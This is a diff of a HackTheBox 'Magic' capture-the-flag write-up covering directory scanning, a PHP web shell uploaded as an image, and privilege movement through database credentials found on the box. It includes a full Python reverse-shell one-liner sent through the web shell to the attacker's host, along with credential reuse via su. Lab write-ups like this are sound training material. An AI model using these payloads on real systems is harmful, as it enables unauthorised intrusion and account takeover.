@@ -18,6 +18,8 @@ Other than three folders (```/assets /images /server-status```) we don't find an
 
 Because we will probably try to upload shell code to our target for initial access it is important to know where the files will be uploaded. Therefor we will run another gobuster scan on the ```/images``` directory.
 
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/8.png">
+
 We've found an ```/uploads``` folder. This might be usefull later on.
 
 # Initial Foothold
@@ -47,7 +49,7 @@ That worked!
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/5.png">
 
-We can now alter the command to spawn a reverse shell. We'll use the Python code from the Pentestmonkey Cheat Sheet.
+We can now alter the command to spawn a reverse shell. We'll use the code from the PayloadAllTheThings repo. https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ```
 http://10.10.10.185/images/uploads/exploit.php.png?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444))](http://10.10.10.185/images/uploads/exploit.php.png?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.6%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27)
@@ -67,12 +69,21 @@ Press ctrl+z key combination
 stty raw -echo; fg
 ``` 
 
-We'll look around for files with SUID set, crontab jobs, kernel version, running processes but nothing stands out here. While looking around our webserver folders we discover a file containing database information.
+We'll look around for files with SUID set, crontab jobs, kernel version, running processes but nothing stands out here. While looking around our webserver folders we discover a file containing database login credentials.
 
 ```
-/var/www/Mafic/db.php5
+/var/www/Magic/db.php5
 ```
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/7.png">
 
+We can try to connect to the MySQL database using ```mysql``` but it isn't installed on the target. Another tool we can use is ```mysqldump```, which is installed.
+
+Running the following code will iterate the tables in the database. We run into an access denied error but are able to view the content of the login table. This contains a password. We try if this is the password for the theseus account which seems to be the case.
+
+```
+su theseus
+```
+
+We are now able to grab the user.txt file in the homefolder of theseus.
 
 # Privilege Escalation
